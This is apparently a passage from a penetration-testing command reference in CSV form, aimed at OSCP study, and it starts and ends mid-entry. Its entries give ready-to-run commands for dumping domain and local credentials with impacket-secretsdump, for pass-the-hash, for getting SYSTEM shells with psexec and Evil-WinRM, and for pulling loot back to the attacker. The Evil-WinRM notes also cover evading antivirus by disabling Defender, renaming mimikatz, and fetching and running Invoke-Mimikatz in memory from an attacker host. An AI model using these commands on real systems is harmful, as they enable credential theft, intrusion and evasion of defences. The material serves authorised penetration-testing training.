impacket-secretsdump './administrator:P@ssw0rd@192.168.50.100' -sam

LSA secrets only (cached creds):
impacket-secretsdump './administrator:P@ssw0rd@192.168.50.100' -lsa

Pass-the-Hash:
impacket-secretsdump -hashes :<NTLM> 'corp.com/admin@192.168.50.70'

Offline NTDS.dit processing:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

Save output to files:
impacket-secretsdump -just-dc 'corp.com/admin:pass@dc' -outputfile corp_dump
# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.cached

USE CASES BY TARGET:
Domain Controller  -just-dc or -just-dc-user (DCSync)
Workstation/Server  -sam (local accounts) or default (tries all)
Offline NTDS.dit  -ntds + -system flags

OUTPUT PARSING:
Extract NTLM hashes only:
impacket-secretsdump -just-dc 'corp/admin:pass@dc' | cut -d':' -f4 > ntlm.txt

Find specific user:
impacket-secretsdump -just-dc 'corp/admin:pass@dc' | grep -i administrator

TIME ESTIMATE: 
DCSync single user: 2-10 seconds
DCSync full domain: 30 seconds - 15 minutes (size dependent)
SAM dump: 5-15 seconds
Automatic mode: 10-60 seconds","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""ERROR_DS_DRA_ACCESS_DENIED (0x2105)"": ""DCSync requires Domain Admin. Verify: crackmapexec smb <DC> -u <USER> -p <PASS> --groups. User must have DS-Replication-Get-Changes rights (Domain Admins by default)."", ""STATUS_ACCESS_DENIED (SAM dump)"": ""Requires local Administrator. Verify admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth (look for Pwn3d!)."", ""Connection refused"": ""SMB port 445 blocked. Verify: sudo nmap -p 445,135 -Pn <TARGET>. secretsdump requires SMB + RPC access."", ""Empty output"": ""No credentials found OR specific dump method failed. Try explicit flags: -sam (local SAM), -just-dc (DCSync), -lsa (LSA secrets). Automatic mode may silently skip failed methods.""}","{""impacket-secretsdump (no flags)"": ""Automatic mode - tries ALL extraction methods: (1) DCSync via DRSUAPI (if targeting DC), (2) SAM dump via registry remote access, (3) LSA secrets (cached domain creds), (4) NTDS.dit dump (if DC). Output contains all discovered hashes. ADVANTAGE: Comprehensive one-command extraction. DISADVANTAGE: Noisy (generates multiple log events). For targeted extraction, use specific flags."", ""-just-dc"": ""DCSync ONLY mode - extract all domain credentials via DRSUAPI replication. Requires Domain Admin privileges and DC as target. Outputs hundreds/thousands of hashes for large domains. Use when targeting AD domain controller."", ""-just-dc-user <USERNAME>"": ""DCSync single user - extract specific account (e.g., krbtgt, Administrator). RECOMMENDED for OSCP - faster, quieter, targeted. Example: -just-dc-user krbtgt for Golden Ticket preparation."", ""-sam"": ""Dump SAM database only (local accounts). Requires local admin. Use when targeting workstations/member servers. Extracts local user NTLM hashes."", ""-lsa"": ""Dump LSA secrets only - includes cached domain credentials, service account passwords, machine account passwords. Useful for lateral movement credential discovery."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication. Example: -hashes :8846f7eaee8fb117ad06bdd830b7586c. Use when you have hash but not password."", ""-ntds <NTDS_FILE>"": ""Offline NTDS.dit processing. Requires NTDS.dit and SYSTEM hive extracted from DC. Example: -ntds ntds.dit -system system.hive LOCAL. For offline analysis after NTDS.dit exfiltration.""}","","[""ad-dcsync-secretsdump-user"", ""ad-dcsync-secretsdump-all"", ""crackmapexec-sam-dump""]","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-impacket-psexec"", ""ad-golden-ticket-mimikatz-create""]"
"psexec","PSExec Remote Shell (Impacket)","exploitation","impacket-psexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'","Execute commands remotely via SMB using PSExec technique. Gets SYSTEM shell on target.","lateral-movement","impacket-psexec 'corp.local/admin:Password123!@192.168.50.70'","Requires admin access and ADMIN$ share. Creates Windows service on target. Alternative to evil-winrm when WinRM not available.","high","","","","","{""-hashes"": ""Use NTLM hash instead of password: -hashes :<NTLM>""}","","",""
"secretsdump","Secretsdump Credential Extraction (Impacket)","exploitation","impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'","Extract credentials from target (DCSync, SAM dump, LSA secrets)","credential-dumping","impacket-secretsdump 'corp.local/admin:Password123!@192.168.50.70'","Use -just-dc-user krbtgt for Golden Ticket hash. See impacket-secretsdump for detailed documentation.","high","","","","","{""-just-dc"": ""DCSync only (Domain Controllers)"", ""-just-dc-user <user>"": ""DCSync specific user (e.g., krbtgt)"", ""-sam"": ""Dump local SAM database"", ""-hashes"": ""Use NTLM hash: -hashes :<NTLM>""}","","",""
"msf-db-init","Initialize Metasploit Database","exploitation","sudo msfdb init","Initialize PostgreSQL database for Metasploit Framework to enable persistent storage of hosts, services, credentials, and loot","metasploit","","One-time setup per Kali installation.

Database persists across reboots and msfconsole sessions.

Enables workspace organization and automated storage of reconnaissance data.","high","","","","{""already_initialized"": ""Run: sudo msfdb reinit (WARNING: deletes existing data)"", ""port_conflict"": ""Kill process using port 5432: sudo lsof -ti:5432 | xargs sudo kill -9"", ""connection_failed"": ""Restart PostgreSQL: sudo systemctl restart postgresql"", ""permission_denied"": ""Ensure user in postgres group: sudo usermod -aG postgres $USER""}","{""init"": ""Create new database instance with msf and msf_test databases"", ""sudo"": ""Required for PostgreSQL service management and database creation""}","","","[""msf-console-start"", ""msf-db-status""]"
"msf-db-status","Check Metasploit Database Connection","exploitation","db_status","Verify database connectivity from within msfconsole","metasploit","","Run this immediately after starting msfconsole to confirm database is accessible.

Without database, workspace features and automated storage will not function.","high","","","","{""not_connected"": ""Run: msfdb start (outside msfconsole)"", ""database_not_initialized"": ""Run: sudo msfdb init (outside msfconsole)""}","","[""msf-db-init"", ""msf-console-start""]","","[""msf-workspace-create"", ""msf-db-import""]"
"msf-console-start","Start Metasploit Console","exploitation","msfconsole -q","Start Metasploit Framework console in quiet mode (skip ASCII banner for faster startup)","metasploit","","Console provides interactive interface to all Metasploit modules.

Use -q flag for faster startup during engagements.

Exit with 'exit' or Ctrl+C.","high","","","","{""database_not_connected"": ""Run: sudo msfdb init (if first time) or msfdb start"", ""slow_startup"": ""Use -q flag to skip banner (saves 2-3 seconds)"", ""gem_errors"": ""Update gems: sudo gem update bundler && bundle install"", ""command_not_found"": ""Install Metasploit: sudo apt update && sudo apt install metasploit-framework""}","{""-q"": ""Quiet mode - suppress ASCII banner and version info (faster startup)"", ""-r <SCRIPT>"": ""Run resource script on startup (optional)"", ""-x '<COMMAND>'"": ""Execute command and return to shell (optional)""}","[""msf-db-init""]","","[""msf-db-status"", ""msf-workspace-create"", ""msf-search-exploit""]"
"msf-console-resource","Start Metasploit Console with Resource Script","exploitation","msfconsole -q -r <RESOURCE_SCRIPT>","Start msfconsole and automatically execute commands from a resource script file","metasploit","msfconsole -q -r ~/listener.rc","Resource scripts automate repetitive tasks like setting up handlers, scanning, or post-exploitation.

Useful for consistent multi-engagement setups.","medium","","","","{""file_not_found"": ""Use absolute path or ensure file exists in current directory"", ""syntax_errors"": ""Test script line-by-line in msfconsole first"", ""script_fails_silently"": ""Remove -q flag to see full output and error messages""}","{""-q"": ""Quiet mode - skip banner for faster execution"", ""-r"": ""Execute resource script on startup""}","","","[""msf-session-interact""]"
"msf-workspace-list","List Metasploit Workspaces","exploitation","workspace","Display all workspaces in the Metasploit database.
Current workspace is marked with asterisk.","metasploit","","Workspaces organize data by engagement or target network.

Prevents mixing reconnaissance data from different assessments.","high","","","","{""no_workspaces"": ""Create one with: workspace -a <NAME>"", ""database_error"": ""Check connection with: db_status""}","","[""msf-db-status""]","","[""msf-workspace-create"", ""msf-workspace-switch""]"
"msf-workspace-create","Create Metasploit Workspace","exploitation","workspace -a <WORKSPACE_NAME>","Create new workspace to isolate hosts, services, and credentials for a specific engagement","metasploit","workspace -a client_pentest_2024","Creating a workspace automatically switches to it.

All subsequent reconnaissance data (hosts, services, creds) will be stored in this workspace.","high","","","","{""already_exists"": ""Use: workspace <NAME> to switch to existing workspace"", ""invalid_name"": ""Use alphanumeric characters, underscores, and hyphens only""}","{""-a"": ""Add new workspace"", ""-d"": ""Delete workspace"", ""-r"": ""Rename workspace""}","[""msf-db-status""]","","[""msf-db-import"", ""msf-db-nmap""]"
"msf-workspace-switch","Switch Metasploit Workspace","exploitation","workspace <WORKSPACE_NAME>","Switch to different workspace to access its stored hosts, services, and credentials","metasploit","workspace client_pentest_2024","Switching workspaces changes the context for all database queries (hosts, services, creds, loot).

Each workspace is isolated.","medium","","","","{""workspace_not_found"": ""List available workspaces with: workspace"", ""case_sensitive"": ""Workspace names are case-sensitive - check exact spelling""}","","[""msf-workspace-create""]","","[""msf-db-hosts"", ""msf-db-services""]"
"msf-search-exploit","Search for Exploit Modules","exploitation","search <QUERY> type:exploit","Search Metasploit module database for exploits matching service, CVE, or keyword","metasploit","search apache type:exploit","Use 'info <INDEX>' or 'info <MODULE_PATH>' for detailed module description before selection.

Rank 'excellent' indicates most reliable exploits.","high","","","","{""no_results"": ""Try broader search (remove filters, use partial name)"", ""too_many_results"": ""Add filters: type, platform, rank, or cve"", ""database_not_indexed"": ""Reinitialize database: sudo msfdb reinit""}","{""type:exploit"": ""Filter results to exploit modules only (exclude auxiliary, post, etc)"", ""type:auxiliary"": ""Filter to auxiliary modules (scanners, fuzzers, etc)"", ""platform:<OS>"": ""Filter by target OS (linux, windows, osx, solaris, bsd, etc)"", ""cve:<CVE>"": ""Search by CVE number (e.g., cve:2021-44228)"", ""rank:<LEVEL>"": ""Filter by reliability (excellent, great, good, normal, average, low)"", ""app:<NAME>"": ""Filter by application name""}","[""msf-console-start""]","","[""msf-use-module"", ""msf-info-module""]"
"msf-use-module","Activate Metasploit Module","exploitation","use <MODULE_PATH>","Load and activate a module for configuration and execution.
Module path or search index accepted.","metasploit","use exploit/multi/handler","After 'use', all commands (set, show options, run) operate in context of this module.

Use 'back' to deselect module and return to main prompt.","high","","","","{""module_not_found"": ""Verify path with: search <MODULE_NAME>"", ""outdated_path"": ""Module paths change - use search to find current path"", ""wrong_module_type"": ""Use correct prefix: exploit/, auxiliary/, post/, etc""}","","[""msf-search-exploit""]","","[""msf-show-options"", ""msf-info-module"", ""msf-show-payloads""]"
"msf-info-module","Display Module Information","exploitation","info <MODULE_PATH>","Show detailed information about a module including description, authors, references, targets, and options","metasploit","info exploit/windows/smb/ms17_010_eternalblue","Review 'Rank' (reliability), 'Check supported' (can verify vulnerability before exploiting), and 'Module stability' before using unfamiliar modules.

'Module side effects' warns of log entries or artifacts.","high","","","","{""module_not_found"": ""Use search to find correct path""}","","[""msf-search-exploit""]","","[""msf-use-module""]"
"msf-show-options","Display Module Options","exploitation","show options","List all configurable options for currently active module, including required settings and current values","metasploit","","Focus on 'Required:
yes' options.

Some options auto-fill from previous sessions.

Use 'show missing' to see only unfilled required options.","high","","","","{""no_module_selected"": ""Use a module first with: use <MODULE_PATH>""}","{""show options"": ""Display basic module options"", ""show advanced"": ""Display advanced module options (not commonly changed)"", ""show evasion"": ""Display evasion options (if supported by module)"", ""show missing"": ""Display only required options that are not yet set""}","[""msf-use-module""]","","[""msf-set-option""]"
"msf-set-option","Set Module Option","exploitation","set <OPTION> <VALUE>","Configure a module option with specific value.
Setting applies to currently active module only.","metasploit","set RHOSTS 192.168.45.100","Common options:
RHOSTS (target IPs), RPORT (target port), LHOST (attacker IP), LPORT (attacker port).

RHOSTS accepts single IP, range (192.168.1.1-50), CIDR (192.168.1.0/24), or file:path.","high","","","","{""option_not_recognized"": ""Check exact option name with: show options"", ""value_format_wrong"": ""Review description in 'show options' for expected format""}","{""set"": ""Set option for current module only"", ""setg"": ""Set option globally (applies to all modules in session)"", ""unset"": ""Clear option value for current module"", ""unsetg"": ""Clear global option value""}","[""msf-use-module"", ""msf-show-options""]","[""msf-setg-option""]","[""msf-exploit-run"", ""msf-show-options""]"
"msf-setg-option","Set Global Module Option","exploitation","setg <OPTION> <VALUE>","Set option value globally - applies to all modules in current msfconsole session","metasploit","setg LHOST 192.168.45.5","Useful for attacker IP/port that stays constant across multiple exploits.

Global options don't persist across msfconsole restarts - use resource scripts for permanent settings.","medium","","","","{""option_overridden"": ""Module-specific 'set' takes precedence over 'setg'""}","{""setg"": ""Set global option (persists across module switches)"", ""unsetg"": ""Clear global option""}","[""msf-console-start""]","[""msf-set-option""]","[""msf-use-module""]"
"msf-back","Exit Current Module","exploitation","back","Deselect current module and return to main msfconsole prompt","metasploit","","Module-specific options (set with 'set') are preserved if you return to same module.

Global options (set with 'setg') persist regardless.","medium","","","","","","[""msf-use-module""]","","[""msf-search-exploit"", ""msf-use-module""]"
"msf-db-import","Import Scan Results to Database","exploitation","db_import <SCAN_FILE>","Import nmap XML, nessus, or other scan formats into Metasploit database for automated host/service population","metasploit","db_import /home/kali/scans/network.xml","Supported formats:
nmap XML (-oX), nessus (.nessus), nmap grepable (-oG with limitations).

XML format is most reliable.

After import, use 'hosts' and 'services' to verify data loaded correctly.","high","","","","{""file_not_found"": ""Use absolute path or ensure file exists"", ""unsupported_format"": ""Use nmap XML format: nmap -oX scan.xml <TARGET>"", ""empty_import"": ""Verify scan file contains results (cat <FILE>)""}","","[""msf-workspace-create""]","[""msf-db-nmap""]","[""msf-db-hosts"", ""msf-db-services""]"
"msf-db-nmap","Run Nmap from Metasploit","exploitation","db_nmap <NMAP_OPTIONS> <TARGET>","Execute nmap scan from within msfconsole and automatically import results to database","metasploit","db_nmap -sV -sC -p- 192.168.45.0/24","db_nmap automatically imports results - no need for separate db_import.

Results are stored in current workspace.

Use standard nmap syntax - all flags supported.","high","","","","{""permission_denied"": ""Start msfconsole with sudo: sudo msfconsole"", ""database_not_storing"": ""Verify connection with: db_status"", ""nmap_not_found"": ""Install nmap: sudo apt install nmap""}","{""-sV"": ""Service version detection"", ""-sC"": ""Default NSE scripts"", ""-p-"": ""Scan all 65535 ports"", ""-A"": ""Aggressive scan (OS, version, script, traceroute)""}","[""msf-workspace-create"", ""msf-db-status""]","","[""msf-db-hosts"", ""msf-db-services"", ""msf-db-vulns""]"
"msf-db-hosts","List Discovered Hosts","exploitation","hosts","Display all hosts stored in current workspace's database","metasploit","","Use 'hosts -R' to automatically set RHOSTS option to all discovered hosts.

Filter with:
hosts -S <IP_PARTIAL> to find specific hosts.","high","","","","{""no_hosts"": ""Import scan results with: db_import <FILE> or db_nmap"", ""wrong_workspace"": ""Switch workspace with: workspace <NAME>""}","{""hosts"": ""List all hosts"", ""hosts -c <COLUMNS>"": ""Display specific columns only"", ""hosts -S <SEARCH>"": ""Search/filter hosts"", ""hosts -R"": ""Set RHOSTS to all hosts in database (for current module)""}","[""msf-db-import""]","","[""msf-db-services""]"
"msf-db-services","List Discovered Services","exploitation","services","Display all services (open ports) stored in current workspace's database","metasploit","","Filter by port to find all hosts with specific service:
services -p 445.

Use 'services -p <PORT> -R' to auto-populate RHOSTS with all hosts running that service.","high","","","","{""no_services"": ""Import scan with service detection: db_nmap -sV <TARGET>"", ""missing_versions"": ""Service versions require -sV flag in nmap scan""}","{""services"": ""List all services"", ""services -p <PORT>"": ""Filter by specific port number"", ""services -S <NAME>"": ""Search by service name"", ""services -R"": ""Set RHOSTS to all hosts with matching services (for current module)"", ""services -c <COLUMNS>"": ""Display specific columns only""}","[""msf-db-import""]","","[""msf-search-exploit"", ""msf-use-module""]"
"msf-db-vulns","List Discovered Vulnerabilities","exploitation","vulns","Display vulnerabilities identified by Metasploit modules and stored in database","metasploit","","Vulnerabilities are added by check-capable modules and some auxiliary scanners.

Not all vulnerabilities are automatically detected - manual module execution may be required.","medium","","","","{""no_vulns"": ""Run auxiliary/scanner modules to detect vulnerabilities"", ""outdated_checks"": ""Update Metasploit: sudo msfupdate""}","{""vulns"": ""List all vulnerabilities"", ""vulns -p <PORT>"": ""Filter by port"", ""vulns -h <HOST>"": ""Filter by host""}","[""msf-db-import""]","","[""msf-search-exploit""]"
"msf-db-creds","List Stored Credentials","exploitation","creds","Display all captured credentials (passwords, hashes, tokens) stored in database","metasploit","","Credentials automatically stored by modules like auxiliary/scanner/ssh/ssh_login, post/windows/gather/hashdump, load kiwi (mimikatz).

Export with:
creds -o creds.txt","high","","","","{""no_creds"": ""Credentials added by successful auxiliary/scanner modules or post-exploitation modules""}","{""creds"": ""List all credentials"", ""creds -p <PORT>"": ""Filter by service port"", ""creds -t <TYPE>"": ""Filter by type (password, hash, etc)""}","[""msf-db-status""]","","[""evil-winrm-hash""]"
"msf-workspace-add","Add New Metasploit Workspace","exploitation","workspace -a <WORKSPACE_NAME>","Create and switch to a new workspace for organizing engagement data","metasploit","workspace -a oscp_lab","Creating workspace automatically switches to it. All subsequent hosts, services, and credentials stored in this workspace.","high","","","","","{""-a"": ""Add new workspace and automatically switch to it""}","","",""
"msf-workspace-delete","Delete Metasploit Workspace","exploitation","workspace -d <WORKSPACE_NAME>","Delete a workspace and all its stored data (hosts, services, credentials)","metasploit","workspace -d old_engagement","Cannot delete currently active workspace. Switch to different workspace first with 'workspace <OTHER>'.","medium","","","","","{""-d"": ""Delete workspace and all associated data (WARNING: irreversible)""}","","",""
"msf-hosts-list","List All Discovered Hosts","exploitation","hosts","Display all hosts discovered and stored in current workspace database","metasploit","","Use 'hosts -R' to automatically populate RHOSTS with all discovered hosts for scanning modules.","high","","","","","{""hosts"": ""List all hosts in current workspace"", ""-c <COLUMNS>"": ""Display specific columns (address, mac, name, os_name)"", ""-S <SEARCH>"": ""Search/filter hosts by string"", ""-R"": ""Set RHOSTS to all hosts (for current module)""}","","",""
"msf-services-filter-port","Filter Services by Port","exploitation","services -p <PORT>","List all hosts with a specific port open from database","metasploit","services -p 445","Combine with -R to auto-populate RHOSTS: 'services -p 445 -R' sets all SMB hosts as targets.","high","","","","","{""-p"": ""Filter services by port number"", ""-R"": ""Set RHOSTS to all hosts with matching port (for exploits)""}","","",""
"msf-db-export","Export Database to File","exploitation","db_export -f <FORMAT> <FILENAME>","Export all workspace data (hosts, services, credentials) to file for backup or reporting","metasploit","db_export -f xml engagement_data.xml","XML format exports complete workspace data. Use pwdump format for credential-only export compatible with hashcat/john.","medium","","","","","{""-f xml"": ""Export in XML format (full data)"", ""-f pwdump"": ""Export credentials in pwdump format""}","","",""
"msf-search-keyword","Search Modules by Keyword","exploitation","search <KEYWORD>","Search all Metasploit modules by name, description, or keyword","metasploit","search eternalblue","Combine filters for precise results: 'search eternalblue type:exploit platform:windows'","high","","","","","{""search"": ""Search module database"", ""type:exploit"": ""Filter to exploit modules only"", ""type:auxiliary"": ""Filter to auxiliary modules only"", ""platform:windows"": ""Filter by target platform""}","","",""
"msf-search-cve","Search Modules by CVE","exploitation","search cve:<CVE_ID>","Search for Metasploit modules by CVE identifier","metasploit","search cve:2017-0144","Use CVE year-number format without 'CVE-' prefix. Example: cve:2021-44228 for Log4Shell.","high","","","","","{""cve:"": ""Search by CVE identifier (omit CVE- prefix)""}","","",""
"msf-search-platform","Search Modules by Platform","exploitation","search platform:<PLATFORM>","Search for Metasploit modules by target platform","metasploit","search platform:windows","Combine with other filters: 'search platform:windows type:exploit smb'. Common platforms: windows, linux, osx, unix, android.","high","","","","","{""platform:"": ""Filter by target OS platform""}","","",""
"msf-search-type","Search Modules by Type","exploitation","search type:<TYPE>","Search for Metasploit modules by module type","metasploit","search type:exploit","Types: exploit (attack), auxiliary (scan/enum), post (post-exploitation), payload (shellcode). Combine: 'search type:exploit smb'.","high","","","","","{""type:"": ""Filter by module type (exploit, auxiliary, post, payload, encoder, nop)""}","","",""
"msf-services-list","List All Discovered Services","exploitation","services","Display all services (open ports) stored in current workspace database","metasploit","","Shows services from db_nmap or db_import. Filter with -p <port> to find all hosts with specific service. Use -R to set RHOSTS automatically.","high","","","","","{""services"": ""List all services in current workspace"", ""-p <PORT>"": ""Filter by port number"", ""-S <NAME>"": ""Search by service name"", ""-R"": ""Set RHOSTS to all matching hosts""}","","",""
"msf-creds-list","List Stored Credentials","exploitation","creds","Display all credentials (passwords, hashes) stored in Metasploit database","metasploit","","Shows credentials captured by successful brute force modules. Export with: creds -o creds.txt. Use captured creds with pass-the-hash attacks.","high","","","","","{""creds"": ""List all credentials in current workspace"", ""-p <PORT>"": ""Filter by service port"", ""-t <TYPE>"": ""Filter by credential type (password, hash)""}","","",""
"msf-show-advanced","Show Advanced Module Options","exploitation","show advanced","Display advanced configuration options for current module","metasploit","","Shows hidden options like timeouts, encoding, proxies, and evasion settings. Useful for troubleshooting or evading detection. Most OSCP scenarios don't require advanced options.","medium","","","","","{""show advanced"": ""Display advanced options not shown in 'show options'""}","","",""
"evil-winrm","Evil-WinRM Remote Shell","exploitation","evil-winrm -i <TARGET> -u <USER> -p '<PASS>'","Establish interactive PowerShell shell over WinRM (port 5985/5986)","lateral-movement","evil-winrm -i 192.168.50.70 -u Administrator -p 'Password123!'","Requires WinRM enabled (default on modern Windows). Use -H for pass-the-hash. Built-in upload/download commands for file transfer.","high","","","","","{""-i"": ""Target IP or hostname"", ""-u"": ""Username"", ""-p"": ""Password (quote if special chars)"", ""-H"": ""NTLM hash instead of password"", ""-S"": ""Use HTTPS (port 5986)""}","","",""
"evil-winrm-upload-file","Evil-WinRM Upload File to Target","exploitation","upload <LOCAL_FILE>","Upload file from local Kali machine to remote Windows target through Evil-WinRM session. Deploys tools (mimikatz, Rubeus, winPEAS) or payloads (shells, exploits) for execution. Default destination: Current working directory on remote system.","file-transfer","upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe","OSCP METHODOLOGY: File upload is MANDATORY for deploying tools on target systems. Evil-WinRM upload is preferred over HTTP transfer because: (1) No web server setup needed, (2) Works over WinRM (already established), (3) Simpler syntax than certutil/PowerShell.

TIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)

FILE SIZE LIMITS:
- Small files (<5MB): Fast, no issues (mimikatz.exe ~1.2MB, winPEAS ~2MB)
- Medium files (5-20MB): May timeout on slow connections
- Large files (>20MB): Use alternative transfer methods (SMB, chunked HTTP)

COMMON FILES TO UPLOAD:
1. Mimikatz: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
2. winPEAS: /opt/winPEAS/winPEASx64.exe (enumeration)
3. Rubeus: /opt/Rubeus/Rubeus.exe (Kerberos attacks)
4. SharpHound: /opt/BloodHound/Collectors/SharpHound.exe (AD enumeration)
5. nc.exe: /usr/share/windows-binaries/nc.exe (reverse shells)
6. PowerUp.ps1: /opt/PowerSploit/Privesc/PowerUp.ps1 (Windows privesc)

OPTIMIZATION:
- Navigate to writable directory BEFORE uploading: cd C:\temp
- Rename suspicious tools: upload /path/mimikatz.exe mm.exe
- Verify upload success: ls; (Get-Item .\mm.exe).Length

EXAM TIP: Pre-stage common tools in organized directory on Kali (/opt/oscp-tools/) for fast access. Document full paths in cheat sheet.","high","","","","{""Local file not found"": ""Error: 'Cannot find path <LOCAL_FILE>'. Solution: Verify file exists: ls -la /path/to/file. Use tab completion in Evil-WinRM prompt for file paths. Check case sensitivity on Linux (mimikatz.exe vs Mimikatz.exe). If using relative path, verify current directory: pwd"", ""Access denied on remote"": ""Error: 'Access to the path C:\\... is denied'. Causes: (1) No write permissions in directory, (2) AV blocked write, (3) AppLocker policy. Solution: Change directory: cd C:\\temp or cd C:\\Users\\Public. Check writable directories: Get-Acl C:\\temp | Format-List. Alternative: Upload to user's home: cd $env:USERPROFILE\\Documents"", ""WinRM session timeout"": ""Upload hangs or 'connection closed' error. Causes: (1) Large file timeout (default 60 seconds), (2) Network instability, (3) Firewall dropping long connections. Solution: For large files (>10MB), use chunked transfer or alternative methods. Alternative: certutil -urlcache -f http://<LHOST>/file.exe file.exe (start Python HTTP server on Kali)"", ""AV detection during upload"": ""File deleted immediately after upload or upload blocked. Solution: (1) Check AV: Get-MpPreference, (2) Disable Defender: Set-MpPreference -DisableRealtimeMonitoring $true (admin required), (3) Use obfuscated/packed binary, (4) Rename file (mm.exe instead of mimikatz.exe), (5) Upload to excluded location: C:\\Windows\\Tasks\\, (6) Use in-memory execution: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')""}","{""upload command"": ""Evil-WinRM built-in command for file uploads. Syntax: 'upload <local_file> [remote_file]'. If remote_file not specified, uploads to current directory with same filename. Example: 'upload /usr/share/mimikatz/x64/mimikatz.exe mimikatz.exe'. WHY BUILT-IN: No need for web server, SMB server, or network shares. Uses PowerShell remoting for transfer."", ""Default destination"": ""Files upload to current working directory on remote system. Check with 'pwd' before uploading. Change with 'cd C:\\temp' or similar. WHY IMPORTANT: Some directories (C:\\Windows, C:\\Program Files) are write-protected even for admins. OSCP TIP: Use C:\\temp, C:\\Users\\<USER>\\AppData\\Local\\Temp, or C:\\ProgramData (writable by default)."", ""Optional remote filename"": ""Specify destination filename: 'upload /local/file.exe custom_name.exe'. WHY: (1) Rename to avoid AV signatures (mimikatz.exe \u2192 mm.exe), (2) Avoid filename conflicts, (3) Use descriptive names for organization. Example: upload /opt/winPEAS/winPEASx64.exe wp.exe"", ""Upload with path"": ""Specify full remote path: 'upload /local/file.exe C:\\temp\\file.exe'. WHY: Control exact destination without changing directory. Useful for scripts uploading multiple files to different locations.""}","[""evil-winrm-shell""]","[""certutil-download"", ""file-transfer-powershell-download"", ""smbclient-connect""]","[""mimikatz-sekurlsa-logonpasswords"", ""sharphound-collect""]"
"evil-winrm-download-file","Evil-WinRM Download File from Target","exploitation","download <REMOTE_FILE>","Download file from remote Windows target to local Kali machine through Evil-WinRM session. Exfiltrate credentials, mimikatz output, BloodHound data, flags, or loot. Default destination: Current directory on local Kali system.","file-transfer","download C:\temp\creds.txt","OSCP METHODOLOGY: Download ALL valuable data immediately after capture: flags, credentials, enumeration output, screenshots of successful exploits. Don't rely on maintaining access - download and document immediately.

TIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)

COMMON FILES TO DOWNLOAD:
1. Flags: C:\Users\Administrator\Desktop\flag.txt, C:\Users\<USER>\Desktop\flag.txt
2. Mimikatz output: creds.txt, logonpasswords.txt
3. BloodHound data: bh.zip, *_BloodHound.zip
4. SAM/SYSTEM dumps: sam.save, system.save
5. NTDS.dit: ntds.dit (Domain Controller)
6. Configuration files: C:\inetpub\wwwroot\web.config, C:\Windows\Panther\Unattend.xml
7. Enumeration output: winPEAS.txt, PowerUp.txt

BEST PRACTICES:
- Verify before downloading: ls <file>; (Get-Item <file>).Length
- Organize locally: mkdir /home/kali/exam/<TARGET_IP>/loot
- Document in notes: Timestamp, source path, what it contains
- Check integrity: Get-FileHash -Algorithm MD5 <file> (remote) vs md5sum <file> (local)
- Clean up remote files after download: del <file> (OpSec)

FLAG RETRIEVAL WORKFLOW:
1. type C:\Users\Administrator\Desktop\flag.txt (verify content)
2. download C:\Users\Administrator\Desktop\flag.txt /home/kali/exam/target1/root-flag.txt
3. cat /home/kali/exam/target1/root-flag.txt (verify locally)
4. Submit flag
5. Screenshot for report

EXAM TIP: ALWAYS download flags AND important loot immediately. Don't wait until end of exam - machines may become unstable, connections may drop, or you may run out of time.","high","","","","{""Remote file not found"": ""Error: 'Cannot find path C:\\...'. Solution: Verify file exists on remote: ls C:\\temp or Test-Path C:\\temp\\file.txt. Check spelling and path (Windows paths case-insensitive but path separators matter). Use tab completion in Evil-WinRM for remote paths. Check current directory: pwd"", ""Access denied on remote"": ""Error: 'Access to the path is denied'. Causes: (1) No read permissions, (2) File locked by another process, (3) Protected system file. Solution: Check permissions: Get-Acl <file> | Format-List. If locked: Stop-Process -Name <PROCESS> -Force (e.g., mimikatz locking logonpasswords.txt). Alternative: Copy to readable location: copy C:\\Windows\\System32\\file.txt C:\\temp\\file.txt"", ""Download timeout"": ""Large files (>50MB) may timeout. Solution: For large files (BloodHound archives, NTDS.dit, memory dumps), use alternative transfer: (1) SMB: net use Z: \\\\<KALI_IP>\\share /user:<USER> <PASS>, copy file.txt Z:\\, (2) HTTP: python3 -m http.server 80 on Kali, certutil -urlcache -f http://<KALI_IP>/file.txt on Windows, (3) Split files: Compress-Archive, split into chunks, download separately."", ""Local write permission error"": ""Error writing to local destination. Solution: Check Kali permissions: ls -ld /path/to/destination. Use absolute path with write permissions: download C:\\file.txt /tmp/file.txt. Verify disk space: df -h""}","{""download command"": ""Evil-WinRM built-in command for file downloads. Syntax: 'download <remote_file> [local_file]'. If local_file not specified, downloads to current directory on Kali with same filename. Example: 'download C:\\temp\\creds.txt loot/creds.txt'. WHY BUILT-IN: No need for network shares or exfil servers. Uses PowerShell remoting for transfer."", ""Default destination"": ""Files download to current directory on local Kali. Check with 'pwd' (on Kali, not in Evil-WinRM prompt). Change local directory by exiting Evil-WinRM, navigating to desired folder, then reconnecting. OSCP TIP: Organize loot by target: mkdir /home/kali/exam/<TARGET_IP>/loot before connecting."", ""Optional local filename"": ""Specify local destination: 'download C:\\temp\\file.txt custom_name.txt' or 'download C:\\temp\\file.txt /home/kali/loot/file.txt'. WHY: (1) Organize loot (download flag.txt /home/kali/exam/target1/flag.txt), (2) Avoid filename conflicts when attacking multiple targets, (3) Descriptive naming (download creds.txt 192.168.50.75-mimikatz-output.txt).""}","[""evil-winrm-shell""]","[""smbclient-connect"", ""nc-file-transfer""]","[""bloodhound-upload-data"", ""hashcat-crack"", ""capture-root-flag""]"
"msf-show-payloads","List Compatible Payloads","exploitation","show payloads","Display all payloads compatible with currently selected exploit module","metasploit","","Payloads with single slash (/) are staged, double underscore (_) indicates non-staged.

Choose based on space constraints and detection considerations.","high","","","","{""no_module_selected"": ""Use exploit module first with: use <EXPLOIT_PATH>""}","","[""msf-use-module""]","","[""msf-set-payload""]"
"msf-set-payload","Set Exploit Payload","exploitation","set payload <PAYLOAD_PATH>","Configure payload for currently selected exploit module","metasploit","set payload windows/x64/meterpreter/reverse_tcp","Payload selection determines post-exploit capabilities.

